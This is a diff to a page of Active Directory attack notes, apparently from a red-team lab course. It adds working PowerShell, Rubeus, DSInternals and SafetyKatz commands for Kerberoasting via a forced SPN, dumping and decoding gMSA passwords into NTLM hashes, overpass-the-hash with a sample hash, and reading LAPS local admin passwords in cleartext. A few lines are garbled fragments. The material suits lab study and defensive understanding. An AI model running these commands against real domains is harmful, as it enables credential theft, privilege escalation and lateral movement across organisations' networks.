@@ -162,7 +162,7 @@ john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asreph
 
 **1.Enum possible Users**
 
-<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_IdentityReferenceName -match "RDPUsers"}
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_IdentityReferenceName -match "UsernameORGroupname"}
 </strong><strong>
 </strong><strong>Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
 </strong></code></pre>
@@ -182,10 +182,10 @@ Get-ADUser -Identity user1 -properties ServicePrincipalName | select ServicePrin
 
 {% code overflow="wrap" %}
 ```powershell
-Set-DomainObject -Identity user1 -Set @{serviceprincipalname='what/ever'}
+Set-DomainObject -Identity user1 -Set @{serviceprincipalname='domain/myuniquespn'}
 
 Using AD Module
-Set-ADuser -identity user1 -serviceprincipalname @{Add='nameyour/spn'}
+Set-ADuser -identity user1 -serviceprincipalname @{Add='domain/myuniquespn'} -verbose
 ```
 {% endcode %}
 
@@ -193,7 +193,8 @@ Set-ADuser -identity user1 -serviceprincipalname @{Add='nameyour/spn'}
 
 {% code overflow="wrap" %}
 ```powershell
-.\rubeus.exe kerberoast /user:user1 /simple /outfile:setspn.txt
+.\Rubeus.exe kerberoast /user:user1 /simple /outfile:setspn.txt
+.\Rubeus.exe kerberoast /user:user1 /simple /rc4opsec /outfile:setspn.txt
 ```
 {% endcode %}
 
@@ -534,35 +535,50 @@ Modify the kdns.c with your own payload. This is a synchronous task, so if you s
 
 ### Tool
 
-{% code overflow="wrap" %}
-```powershell
-**Enumerate**
-Get-DomainObject -LDAPFilter '(objectClass=msDSGroupManagedServiceAccount)'
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">1. Enumerate where gMSA is used (User)
+Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
 
 ADModule
 Get-ADServiceAccount -Filter *
-Get-ADServiceAccount -Identity usernameHere -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
+<strong>
+</strong><strong>2. Read what pricipals can read the PW from the gMSA
+</strong><strong>ADModule
+</strong>Import-Module .\Microsoft.ActiveDirectory.Management.dll
+import-module .\ActiveDirectory\ActiveDirectory.psd1
+<strong>Get-ADServiceAccount -Identity usernameHere -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
+</strong>
 
-**Get Hash on a server**
-You need to use Sekurlsa::ekeys / sekurlsa:logonpasswords ntlm hash wont work
+2. Exploit
+Once we have compromised a principal that can read the blob open a shell as the user
 
-**Exploit**
-Once we have compromised a principal that can read the blob
-$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDSManagedPassword).'msDS-ManagedPassword'
+*Get Hash on a server*
+You need to use Sekurlsa::ekeys / sekurlsa:logonpasswords ntlm hash wont show
+
+$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
+Decode it and convert to NTLM (clear text pw is not writeable)
 Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
 $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
 ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
+
 sekurlsa::pth /user:usernameHere /domain:dom.local /ntlm:0......
 
-**Verify that PW matches from AD**
-Next step I perform in the lab is to to confirm that the NT password hash that DSInternals provides matches that in Active Directory.
+<strong>(3. Verify that PW matches from AD - optional)
+</strong>Next step I perform in the lab is to to confirm that the NT password hash that DSInternals provides matches that in Active Directory.
 I use the DSInternals command Get-ADReplAccount to get the AD password hash and can confirm that the password hash pulled from the GMSA is the same as that gathered from AD.
 $account = get-adreplaccount -samaccountname 'username/machinename$' -server hostname.dom.local
 $hash2 = convertto-hex -input $account.nthash
 $hash2
 
-```
-{% endcode %}
+4. We can use the hash for Auth and run a cmd as service account
+C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:jumpone /domain:us.techcorp.local /ntlm:3361912e368ac24552f71ffabfa7e0b5 /run:cmd.exe" 
+
+5. Find out where local admin
+ . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+ Find-PSRemotingLocalAdminAccess -Verbose
+
+"exit"/ntlm:0a02c684cc0fa1744195edd1aec43078 
+
+</code></pre>
 
 **Golden gMSA**
 
@@ -572,3 +588,49 @@ $hash2
 * Once the KDS root key is compromised we can’t protect the associated gMSAs accounts.
 * Golden gMSA can be used to retrieve the information of gMSA account, KDS root key and generate the password offline.
 * We need following attributes of the KDS root key to compute the Group Key Envelope (GKE) : – cn – msKds-SecretAgreementParam – msKds-RootKeyData – msKds-KDFParam – msKds-KDFAlgorithmID – msKds-CreateTime – msKds-UseStartTime – msKds-Version – msKds-DomainID – msKds-PrivateKeyLength – msKds-PublicKeyLength – msKds-SecretAgreementAlgorithmID
+
+## 🔑LAPS
+
+### **Description**
+
+* LAPS (Local Administrator Password Solution) provides centralized storage of local users passwords in AD with periodic randomizing.
+* &#x20;"…it mitigates the risk of lateral escalation that results when customers have the same administrative local account and password combination on many computers."&#x20;
+* Storage in clear text, transmission is encrypted (Kerberos).&#x20;
+* Configurable using GPO.&#x20;
+* Access control for reading clear text passwords using ACLs. Only Domain Admins and explicitly allowed users can read the passwords.
+* On Client/Server C:\Program Files\LAPS\CSE\admpwd.dll is responsible
+
+### Requirement
+
+Is LAPS used? Check C:\Program Files\LAPS\CSE\admpwd.dll&#x20;
+
+### Tool
+
+1. Find users who can read the passwords in clear text of machines in OUs:
+
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} 
+</strong><strong>
+</strong><strong>AD-Module
+</strong>Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
+Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
+Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose
+C:\AD\Tools\Get-LapsPermissions.ps1
+
+=> IdentityName can read the Passwords on ObjectDN
+</code></pre>
+
+2. Get the Passwort in Cleartext
+
+{% code overflow="wrap" %}
+```powershell
+Get the Computers in the OU first
+Get-DomainComputer -SearchBase "LDAP://OU=ouname,DC=sub,DC=dom,DC=local"
+
+PowerView
+Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd
+
+AD-Module
+Get-ADComputer -Identity hostname-here -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
+Get-AdmPwdPassword -ComputerName us-mailmgmt
+```
+{% endcode %}
